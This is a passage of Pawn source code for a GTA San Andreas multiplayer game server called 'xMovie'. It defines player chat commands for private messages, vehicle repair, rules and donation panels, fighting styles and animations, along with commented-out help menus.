				/ANN~n~\
				/ANNSTOP~n~\
				/CRX~n~\
				/DELTELE~n~\
				/DELDERBY~n~\
				/SGOTO~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				Set an admin's admin level~n~\
				Connect a bot to the server~n~\
				Announce a message below screen~n~\
				Stop the announcement~n~\
				Crash a player\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~Delete a teleportation~n~\
				Delete a derby~n~\
				Silently teleport to a player~n~\
				~n~\
				\
				");
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Admin Cmds ~p~P13~n~~n~~y~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg3[playerid], "\
				Description~n~~n~~b~\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~n~\
				~n~\
				~n~\
				~n~\
				\
				");
			}
		}
	}
	player[playerid][PMSGtextdraw] = mode;
	return 1;
}

dcmd_vip(playerid,params[])
{
	#pragma unused params
	
    if (!player[playerid][DONATEtextdraw])
	{
		TextDrawShowForPlayer(playerid, donatetd1);
		TextDrawShowForPlayer(playerid, donatetd2);
		player[playerid][DONATEtextdraw] = 1;
    } else {
		TextDrawHideForPlayer(playerid, donatetd1);
		TextDrawHideForPlayer(playerid, donatetd2);
		player[playerid][DONATEtextdraw] = 0;
	}
	return 1;
}

dcmd_premium(playerid,params[])
{
	#pragma unused params

    if (!player[playerid][DONATEtextdraw])
	{
		TextDrawShowForPlayer(playerid, donatetd1);
		TextDrawShowForPlayer(playerid, donatetd2);
		player[playerid][DONATEtextdraw] = 1;
    } else {
		TextDrawHideForPlayer(playerid, donatetd1);
		TextDrawHideForPlayer(playerid, donatetd2);
		player[playerid][DONATEtextdraw] = 0;
	}
	return 1;
}

dcmd_donate(playerid,params[])
{
	#pragma unused params

    if (!player[playerid][DONATEtextdraw])
	{
		TextDrawShowForPlayer(playerid, donatetd1);
		TextDrawShowForPlayer(playerid, donatetd2);
		player[playerid][DONATEtextdraw] = 1;
    } else {
		TextDrawHideForPlayer(playerid, donatetd1);
		TextDrawHideForPlayer(playerid, donatetd2);
		player[playerid][DONATEtextdraw] = 0;
	}
	return 1;
}

dcmd_rules(playerid,params[])
{
	#pragma unused params

	/*SendClientMessage(playerid, COLOR_BLACK, "___________________ Rules of the server ___________________");
	SendClientMessage(playerid, COLOR_RED, "| Instant ban: hacking and/or cheating");
	SendClientMessage(playerid, COLOR_RED, "| Bans: 3rd kick or disrespect against authorities");
	SendClientMessage(playerid, COLOR_ORANGE, "| Kicks: 2nd warning, heavy DMing, spam or disrespect");
	SendClientMessage(playerid, COLOR_YELLOW, "| Others: disrespect, DMing, spam of any kind");
	SendClientMessage(playerid, COLOR_GREEN, "| CLEO mods: no flying look-like mods allowed");
	SendClientMessage(playerid, COLOR_GREEN, "| Creating useless random crap to annoy players = ban");
	SendClientMessage(playerid, COLOR_GREEN, "| Exeptions: interactive mods are allowed (no abuse)");
	SendClientMessage(playerid, COLOR_BLACK, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");*/

    //ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, "xMovie Server Rules", "* Instant ban: hacking and/or cheating\n* Bans: 3rd kick or disrespect against authorities\n* Kicks: 2nd warning, heavy DMing, spam or disrespect\n* Others: disrespect, DMing, spam of any kind\n* CLEO mods: no flying look-like mods allowed\n* Creating useless random crap to annoy players = ban\n* Exeptions: interactive mods are allowed (no abuse)", "I agree", "");

    if (!player[playerid][RULEStextdraw])
	{
		TextDrawShowForPlayer(playerid, nrules);
		player[playerid][RULEStextdraw] = 1;
    } else {
		TextDrawHideForPlayer(playerid, nrules);
		player[playerid][RULEStextdraw] = 0;
	}
	return 1;
}

/*dcmd_gen(playerid,params[])
{
	new idx;

	strings = strtok(params,idx);
	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 5)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /gen <1-5>");

	switch(strval(strings))
	{
	 	case 1:
 		{
			SendClientMessage(playerid, COLOR_GREY, "____________________ P1: General commands:____________________");
			SendClientMessage(playerid, COLOR_CORAL, "| /rules » View the server rules");
			SendClientMessage(playerid, COLOR_CORAL, "| /report <name/id+reason> » Report rulebreakers to online admins");
			SendClientMessage(playerid, COLOR_CORAL, "| /register <password> - Register your name in the server");
			SendClientMessage(playerid, COLOR_CORAL, "| /login <password> » Login to the server");
			SendClientMessage(playerid, COLOR_CORAL, "| /setpass <password> » Change your password");
			SendClientMessage(playerid, COLOR_CORAL, "| /vips » See which VIPs are online");
			SendClientMessage(playerid, COLOR_CORAL, "| /admins » See which admins are online");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /gen 2 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
   		}
	    case 2:
		{
			SendClientMessage(playerid, COLOR_GREY, "____________________ P2: General commands:____________________");
			SendClientMessage(playerid, COLOR_CORAL, "| /afklist » See which players are AFK");
			SendClientMessage(playerid, COLOR_CORAL, "| /kill » Killing yourself");
			SendClientMessage(playerid, COLOR_CORAL, "| /pm <name/id> <msg> » Send a private message (/r - reply pm)");
			SendClientMessage(playerid, COLOR_CORAL, "| /pms » Block all private messages");
			SendClientMessage(playerid, COLOR_CORAL, "| /god » Enable or disable godmode (/vgod = visual vehicle damage)");
			SendClientMessage(playerid, COLOR_CORAL, "| /colour <colourname> » Change the color of your nametag");
			SendClientMessage(playerid, COLOR_CORAL, "| /ptele » Teleport to a spawn point set by an admin");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /gen 3 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
	   }
	   case 3:
	   {
			SendClientMessage(playerid, COLOR_GREY, "___________________ P3: General commands:___________________");
			SendClientMessage(playerid, COLOR_CORAL, "| /spawn <1-3> » Save your current spawnplace");
			SendClientMessage(playerid, COLOR_CORAL, "| /loadpos <1-3> » Teleport to one of your spawn points");
			SendClientMessage(playerid, COLOR_CORAL, "| /unset <1-3> » Delete a spawn point");
			SendClientMessage(playerid, COLOR_CORAL, "| /players » Check information regarding players");
			SendClientMessage(playerid, COLOR_CORAL, "| /jaillist » See which players are jailed");
			SendClientMessage(playerid, COLOR_CORAL, "| /s(kin) <skindID> » Change your skin (or /ssel for scrollist)");
 			SendClientMessage(playerid, COLOR_CORAL, "| /t(ime) hour, /w(eather) weatherid - Change your time/weather");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /gen 4 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
   		}
	   case 4:
	   {
			SendClientMessage(playerid, COLOR_GREY, "___________________ P4: General commands:___________________");
			SendClientMessage(playerid, COLOR_CORAL, "| /w2 <weaponID> (<ammo>) » Give yourself a weapon");
			SendClientMessage(playerid, COLOR_CORAL, "| /csel » Go into camera mode");
			SendClientMessage(playerid, COLOR_CORAL, "| /vsel » Go into vehicle colour mode");
			SendClientMessage(playerid, COLOR_CORAL, "| /jetpack » Give/Remove your jetpack");
			SendClientMessage(playerid, COLOR_CORAL, "| /radio » Bring up Radio Control Panel");
			SendClientMessage(playerid, COLOR_CORAL, "| /postick, psetstick, pounstick » Hold an object");
			SendClientMessage(playerid, COLOR_CORAL, "| MAPEDITOR COMMANDS: /ocommands <1-3>");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
   		}
	   case 5:
	   {
			SendClientMessage(playerid, COLOR_GREY, "___________________ P5: General commands:___________________");
			SendClientMessage(playerid, COLOR_CORAL, "| /sr(setrotation) » Set rotation speed");
			SendClientMessage(playerid, COLOR_CORAL, "| /panels, doors, lights, tires » Update vehicle damage");
			SendClientMessage(playerid, COLOR_CORAL, "| /wreck » Total destroy of your vehicle");
			SendClientMessage(playerid, COLOR_CORAL, "| /fps » Show your Frames Per Seconds");
			SendClientMessage(playerid, COLOR_CORAL, "| /setspawn » Set (default) spawn location");
			SendClientMessage(playerid, COLOR_CORAL, "| /icon » Enables/disables default GTA SA icons");
			SendClientMessage(playerid, COLOR_CORAL, "| /setpass - Change your password");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
   		}

  	}
	return 1;
}

dcmd_veh(playerid,params[])
{
	new idx;

	strings = strtok(params,idx);
	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 3)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /veh <1-3>");

	switch(strval(strings))
	{
	 	case 1:
 		{
			SendClientMessage(playerid, COLOR_GREY, "___________________ P1: Vehicle commands:___________________");
			SendClientMessage(playerid, COLOR_CORAL, "| /fix » Fix the damage of your vehicle");
			SendClientMessage(playerid, COLOR_CORAL, "| /spray » Fix the damage and body of your vehicle");
			SendClientMessage(playerid, COLOR_CORAL, "| /flip » Flip your vehicle to its normal position");
			SendClientMessage(playerid, COLOR_CORAL, "| /(un)lock or /(u)l » (un)lock your vehicle");
			SendClientMessage(playerid, COLOR_CORAL, "| /eject <name/id> » Eject passengers from your vehicle");
			SendClientMessage(playerid, COLOR_CORAL, "| /tune » Tune your vehicle");
			SendClientMessage(playerid, COLOR_CORAL, "| /carcolour <colourname> » Set your vehicles color(s)");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /veh 2 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
    	}
	    case 2:
		{
			SendClientMessage(playerid, COLOR_GREY, "___________________ P2: Vehicle commands:___________________");
			SendClientMessage(playerid, COLOR_CORAL, "| /numberplate » Change numberplate");
			SendClientMessage(playerid, COLOR_CORAL, "| /ramps » Enable or disable ramps (activate with CTRL)");
			SendClientMessage(playerid, COLOR_CORAL, "| /af(antifall) » Enable/disable bike anti fall, drivers only!");
			SendClientMessage(playerid, COLOR_CORAL, "| /nos » Add nitro to your vehicle");
			SendClientMessage(playerid, COLOR_CORAL, "| /delnos » Delete nitro on your vehicle");
			SendClientMessage(playerid, COLOR_CORAL, "| /v, /vx <vehicle> » Spawn a/inside vehicle");
			SendClientMessage(playerid, COLOR_CORAL, "| /cc » Change your current vehicle");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /veh 3 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
   		}
	    case 3:
		{
			SendClientMessage(playerid, COLOR_GREY, "___________________ P3: Vehicle commands:___________________");
			SendClientMessage(playerid, COLOR_CORAL, "| /tow » Tow a nearby vehicle");
			SendClientMessage(playerid, COLOR_CORAL, "| /setveh(icle) - Adjust vehicle options");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
   		}
  	}
	return 1;
}

dcmd_misc(playerid,params[])
{
	new idx;

	strings = strtok(params,idx);
	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 6)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /misc <1-6>");

	switch(strval(strings))
	{
	 	case 1:
		{
			SendClientMessage(playerid, COLOR_GREY, "___________________ P1: Miscel. commands:___________________");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /derby <derbyID> » Enter one of the derby areas");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /derbylist » See which derby areas there are");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /dm <dmID> » Enter one of the DM areas");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /specdm <dmID> » Spectate a DM area");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /exit » Exit a DM/derby");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /goto <name/id> (<XYZ_Offset>) » Teleport to a player");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /turngoto on|off » Allow/Forbid players to teleport to you");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /misc 2 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
  		}
	    case 2:
		{
			SendClientMessage(playerid, COLOR_GREY, "___________________ P2: Miscel. commands:___________________");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /world <worldID> » Change your world");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /nameon|nameoff » Turn nametags on/off");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /afk (<reason>)» Put a server message saying you are AFK");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /back » Put a server message saying you are back from AFK");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /vote » Cast your vote (only possible if a vote is running)");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /fi(ght) » Set your fighting style");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /skill » Set your weapon skills (For weapon IDs use /w2)");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /misc 3 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
		}
	    case 3:
		{
			SendClientMessage(playerid, COLOR_GREY, "___________________ P3: Miscel. commands:___________________");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /remove » Remove all of your weapons");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /nofire » Remove fire near you");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /spec <name/id> » Spectate someone");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /getinfo <name/id> » Get information about a player");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /me » Put a server message saying what you are doing");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /bu(bble) » Put a server message above your head");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /misc 4 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
  		}
		case 4:
		{
			SendClientMessage(playerid, COLOR_GREY, "___________________ P4: Miscel. commands:___________________");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /health » Set your health to 100%");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /armour » Set your armour to 100%");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /spe(cial) » Use animations combined with objects");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /run » Enable/Disable run for all skins mode");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /skate » Enable/Disable skate mode");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /swim » Enable/Disable swim mode");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /drunk » Set your drunk level");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /misc 5 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
  		}
  		case 5:
  		{
			SendClientMessage(playerid, COLOR_GREY, "___________________ P5: Miscel. commands:___________________");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /lsd » Enable LSD mode");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /money » Set the amount of your money");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /(p)ostick » Stick/Hold an object to yourself");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /(p)ounstick » Unstick/Hold an object stuck to you");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /(p)setstick » Set the position of a stuck object");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /chat(group) » Private group conversation");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /f/uf » Freeze/Unfreeze yourself");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯ For more commands type /misc 6 ¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
  		}
  		case 6:
  		{
			SendClientMessage(playerid, COLOR_GREY, "___________________ P6: Miscel. commands:___________________");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /jump » Make a jump");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /sjump » Make a superjump");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /hjump » Make a highjump");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /ms(movespeed) » Increase the speed of your vehicle");
			SendClientMessage(playerid, COLOR_LAWNGREEN, "| /ss(setspeed) » Set the speed of your vehicle");
			SendClientMessage(playerid, COLOR_GREY, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");
  		}
   	}
	return 1;
}*/

dcmd_news(playerid,params[])
{
	#pragma unused params

	format(sMsg, sizeof(sMsg), "%s\n\n%s", servermessage, serverrules);
    ShowPlayerDialog(playerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, "xMovie Server Rules/Updates", sMsg, "OK", "");
	return 1;
}

dcmd_players(playerid,params[])
{
	#pragma unused params

    new k = 0;

    for (new e = 0; e < MAX_PLAYERS; e++)
	if (IsPlayerConnected(e) && !IsPlayerNPC(e)) k++;

	format(tmps1, sizeof(tmps1), "[INFO] Players connected: %d/%d || Empty slots: %d || Ratio: %.2f || Visitors since reset: %d", k, GetMaxPlayers(), GetMaxPlayers()-k, floatdiv(k, GetMaxPlayers()), Visitors);
	SendClientMessage(playerid, 0x00FFFFFF, tmps1);
    return 1;
}

dcmd_pm(playerid,params[])
{
	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

    new idx,
		PMmsg[128];

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /pm <name|id> <message>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /pm <name|id> <message>");

	SpamProtection(playerid, "PM");

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't PM yourself!");

		if (player[playerid][disablepm] == 1)
		return SendErrorMessage(playerid, EMBED_WHITE, "You cannot send Private Messages if you don't want to receive them.");

		if (player[giveplayerid][disablepm] == 1)
		return SendErrorMessage(playerid, EMBED_WHITE, "This player does not want to receive Private Messages.");

		GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));

		if (strlen(playername) + strlen(giveplayername) + strlen(params[strlen(tmps2)+1]) > 117)
		return SendErrorMessage(playerid, EMBED_WHITE, "Your message is too long.");

   		format(PMmsg, sizeof(PMmsg), "-> [PM] %s: %s", giveplayername, params[strlen(tmps2)+1]);
	    SendClientMessage(playerid, 0xFFCC2299, PMmsg);

   		format(PMmsg, sizeof(PMmsg), "<- [PM] %s: %s", playername, params[strlen(tmps2)+1]);
	    SendClientMessage(giveplayerid, 0xFFCC2299, PMmsg);

		player[playerid][lastpm] = giveplayerid;
		player[giveplayerid][lastpm] = playerid;

   		format(PMmsg, sizeof(PMmsg), "[PM] %s -> %s: %s", playername, giveplayername, params[strlen(tmps2)+1]);
		IRC_GroupSay(1, IRCOP_CHANNEL, PMmsg);

   		format(PMmsg, sizeof(PMmsg), "[A-3] "EMBED_BROWN"[PM] %s -> %s: %s", playername, giveplayername, params[strlen(tmps2)+1]);
		for (new a = 0; a < MAX_PLAYERS; a++)
		{
		    if (IsPlayerConnected(a) && player[a][ADMIN] >= 3 && player[a][adminmsgs] == 1)
		    {
		    	if (a == playerid || a == giveplayerid)
				continue;

				SendClientMessage(a, COLOR_RED, PMmsg);
			}
		}
		printflog("ADM-MSG", PMmsg);
		
		if (player[giveplayerid][afk] > 0)
		SendClientMessage(playerid, COLOR_WHITE, "[INFO] The receiver of your PM is currently AFK and may not notice your last message.");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_r(playerid,params[])
{
	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

    new PMmsg[128];

	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /r <message>");

	SpamProtection(playerid, "PM");

	if (player[playerid][lastpm] == -1)
    return SendErrorMessage(playerid, EMBED_WHITE, "Cannot send reply on last PM (No PM received or player not online).");

	if (IsPlayerConnected(player[playerid][lastpm]) && player[playerid][lastpm] != INVALID_PLAYER_ID)
	{
		if (player[playerid][disablepm] == 1)
		return SendErrorMessage(playerid, EMBED_WHITE, "You cannot send Private Messages if you don't want to receive them.");

		if (player[ player[playerid][lastpm] ][disablepm] == 1)
		return SendErrorMessage(playerid, EMBED_WHITE, "This player does not want to receive Private Messages.");

		GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(player[playerid][lastpm], giveplayername, sizeof(giveplayername));

		if (strlen(playername) + strlen(giveplayername) + strlen(params) > 117)
		return SendErrorMessage(playerid, EMBED_WHITE, "Your message is too long.");

   		format(PMmsg, sizeof(PMmsg), "-> [PM] %s: %s", giveplayername, params);
	    SendClientMessage(playerid, 0xFFCC2299, PMmsg);

   		format(PMmsg, sizeof(PMmsg), "<- [PM] %s: %s", playername, params);
	    SendClientMessage(player[playerid][lastpm], 0xFFCC2299, PMmsg);

		player[ player[playerid][lastpm] ][lastpm] = playerid;

   		format(PMmsg, sizeof(PMmsg), "[PM] %s -> %s: %s", playername, giveplayername, params);
		IRC_GroupSay(1, IRCOP_CHANNEL, PMmsg);

   		format(PMmsg, sizeof(PMmsg), "[A-3] "EMBED_BROWN"[PM] %s -> %s: %s", playername, giveplayername, params);
		for (new a = 0; a < MAX_PLAYERS; a++)
		{
		    if (IsPlayerConnected(a) && player[a][ADMIN] >= 3 && player[a][adminmsgs] == 1)
		    {
		    	if (a == playerid || a == player[playerid][lastpm])
				continue;

				SendClientMessage(a, COLOR_RED, PMmsg);
			}
		}
		printflog("ADM-MSG", PMmsg);
		
		if (player[ player[playerid][lastpm] ][afk] > 0)
		SendClientMessage(playerid, COLOR_WHITE, "[INFO] The receiver of your PM is currently AFK and may not notice your last message.");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_actions(playerid,params[])
{
	#pragma unused params

    TogglePlayerControllable(playerid, 0);
	ShowMenuForPlayer(ActionMenu, playerid);
	return 1;
}

dcmd_radio(playerid,params[])
{
	#pragma unused params

	ShowPlayerDialog(playerid, DIALOGID_RADIO, DIALOG_STYLE_LIST, "Radio Control Panel [Main]", "Radio Stations\nCustom Station\nStop Radio\nEnable xAudio\nDisable xAudio", "OK", "Close");
	return 1;
}

dcmd_radio2(playerid,params[])
{
	#pragma unused params

	ShowPlayerDialog(playerid, DIALOGID_RADIO2, DIALOG_STYLE_LIST, "Radio Control Panel [Main]", "Radio Stations\nCustom Station\nChange Volume\nStop Radio\nEnable xAudio [20 sec delay after disconnect]\nDisable xAudio", "OK", "Close");
	return 1;
}

dcmd_health(playerid,params[])
{
	#pragma unused params

    SetPlayerHealth(playerid, 100.0);
	return 1;
}

dcmd_armour(playerid,params[])
{
	#pragma unused params

    SetPlayerArmour(playerid, 100.0);
	return 1;
}

dcmd_armor(playerid,params[])
{
	#pragma unused params

    SetPlayerArmour(playerid, 100.0);
	return 1;
}

dcmd_fix(playerid,params[])
{
	#pragma unused params

	if (!IsPlayerAdminLevel(playerid, 3))
	{
		if (!IsPlayerDriver(playerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");
	}

    SetVehicleHealth(GetPlayerVehicleID(playerid), 1000.0);
    SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Vehicle repaired.");
	return 1;
}

dcmd_spray(playerid,params[])
{
	#pragma unused params

	if (!IsPlayerAdminLevel(playerid, 3))
	{
		if (!IsPlayerDriver(playerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");
	}

	/*if (payandsprayinuse == true)
	return SendClientMessage(playerid, COLOR_WHITE, "Pay'n'Spray is currently in use, try again in a few seconds");

    payandsprayinuse = true;
	GetVehiclePos(GetPlayerVehicleID(playerid), playerxyza[0], playerxyza[1], playerxyza[2]);
	GetVehicleZAngle(GetPlayerVehicleID(playerid), playerxyza[3]);
	SetPlayerPosEx(playerid, 2393.7351, 1490.7202, 10.9179, 180.5389, 0);
	GameTextForPlayer(playerid, "~y~ready in 3 seconds", 3500, 3);
	SetTimerEx("SetPlayerPosEx", 4000, 0, "iffffi", playerid, playerxyza[0], playerxyza[1], playerxyza[2], playerxyza[3], 0);
	SetTimer("EnableSpray", 4500, 0);*/

	RepairVehicle( GetPlayerVehicleID(playerid) );
	SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Vehicle repaired.");
	return 1;
}

dcmd_fight(playerid,params[])
return dcmd_fi(playerid,params);

dcmd_fi(playerid,params[])
{
	if (!strlen(params) || !IsNumeric(params[0]))
	{
	 	SendClientMessage(playerid, COLOR_YELLOW, "[USAGE]: /fi(ght) <0-5>");
	 	SendClientMessage(playerid, COLOR_YELLOW, "[Fightstyles] 0: Default, 1: Boxing, 2: Kungfu, 3: Kneehead, 4: Elbow, 5: None");
		return 1;
	}

	switch(strval(params[0]))
	{
		case 0: return SetPlayerFightingStyle(playerid, FIGHT_STYLE_GRABKICK);
		case 1: return SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
		case 2: return SetPlayerFightingStyle(playerid, FIGHT_STYLE_KUNGFU);
		case 3: return SetPlayerFightingStyle(playerid, FIGHT_STYLE_KNEEHEAD);
		case 4: return SetPlayerFightingStyle(playerid, FIGHT_STYLE_ELBOW);
		case 5: return SetPlayerFightingStyle(playerid, FIGHT_STYLE_NORMAL);
	}
	SendErrorMessage(playerid, EMBED_WHITE, "Unknown fightID, you must pick a valid ID from the list:");
	SendClientMessage(playerid, COLOR_YELLOW, "[Fightstyles] 0: Default, 1: Boxing, 2: Kungfu, 3: Kneehead, 4: Grabkick, 5: Elbow");
	return 1;
}

dcmd_special(playerid,params[])
return dcmd_spe(playerid,params);

dcmd_spe(playerid,params[])
{
	if (!strlen(params) || !IsNumeric(params[0]))
	{
	 	SendClientMessage(playerid, COLOR_YELLOW, "[USAGE]: /spe <0-7>");
	 	SendClientMessage(playerid, COLOR_YELLOW, "[Specials] 0: None, 1: Handsup, 2: Cuffed, 3: Usephone, 4: Stopphone, 5: Beer, 6: Smoke, 7: Wine, 8: Sprunk");
		return 1;
	}

	switch(strval(params[0]))
	{
		//case 0: return ClearAnimations(playerid);
		case 0: return SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		case 1: return SetPlayerSpecialAction(playerid, SPECIAL_ACTION_HANDSUP);
		case 2: return SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CUFFED);
		case 3: return SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE), SetPlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1, 330, 6);
		case 4: return SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE), RemovePlayerAttachedObject(playerid, VIP_MAX_POSTICKS-1);
		case 5: return SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_BEER);
		case 6: return SetPlayerSpecialAction(playerid, SPECIAL_ACTION_SMOKE_CIGGY);
		case 7: return SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_WINE);
		case 8: return SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_SPRUNK);
	}
	SendErrorMessage(playerid, EMBED_WHITE, "Unknown specialID, you must pick a valid ID from the list:");
	SendClientMessage(playerid, COLOR_YELLOW, "[Specials] 0: None, 1: Handsup, 2: Usephone, 3: Stopphone, 4: Beer, 5: Smoke, 6: Wine, 7: Sprunk");
	return 1;
}

dcmd_handsup(playerid,params[])
{
	#pragma unused params

    if (IsPlayerInAnyVehicle(playerid))
    return SendClientMessage(playerid, COLOR_WHITE, "[INFO] You must get out of the vehicle to surrender!");

	if (currentcccriminal == playerid && ccstarted == true)
	{
		if (GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_HANDSUP)
		return SendErrorMessage(playerid, EMBED_WHITE, "You are already surrendering!");

		new Float:criminalxyz[3];
		GetPlayerPos(playerid, criminalxyz[0], criminalxyz[1], criminalxyz[2]);

		for (new ccPlayer = 0; ccPlayer < MAX_COPCHASE_PLAYERS; ccPlayer++)
		{
			if (ccplayerlist[ccPlayer] == -1)
			continue;

